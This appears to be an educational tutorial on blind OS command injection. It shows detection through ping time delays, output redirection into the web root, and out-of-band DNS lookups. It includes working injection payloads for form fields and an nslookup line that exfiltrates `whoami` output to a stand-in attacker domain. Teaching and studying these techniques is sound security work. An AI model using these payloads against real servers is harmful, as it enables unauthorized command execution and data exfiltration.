# Blind OS command injection vulnerabilities

**Blind OS command injection** occurs when command output isn't returned in the HTTP response, requiring different exploitation techniques.

For example, a feedback form that triggers a server-side `mail` command:

`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`

Since the output from the `mail` command (if any) is never returned to the user, simple `echo` payloads won't confirm injection. Instead, other detection and exploitation techniques are needed.

## 1. Detecting blind OS command injection using time delays

Time delays can confirm blind OS command injection. The `ping` command works well for this — by specifying the packet count, you control the delay duration:

```
& ping -c 10 127.0.0.1 &
```

```
email=x||ping+-c+10+127.0.0.1||
```

This pings the loopback adapter 10 times (~10 seconds), and a matching response delay confirms execution.

## 2. Exploiting blind OS command injection by redirecting output

In some case, you can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. 

For example, if the application serves static resources from the filesystem location like `/var/www/static`, `/var/www/images`, then you can submit the following input:

```
& whoami > /var/www/static/whoami.txt &

||whoami>/var/www/images/output.txt||
```

You can then use the browser to fetch `https://vulnerable-website.com/whoami.txt` to retrieve the file, and view the output from the injected command.

## 3. Exploiting blind OS command injection using out-of-band (OAST) techniques

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

```
& nslookup kgji2ohoyw.web-attacker.com &

||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.

---

The out-of-band channel provides an easy way to exfiltrate the output from injected commands:
```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &

||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:
```
wwwuser.kgji2ohoyw.web-attacker.com
```
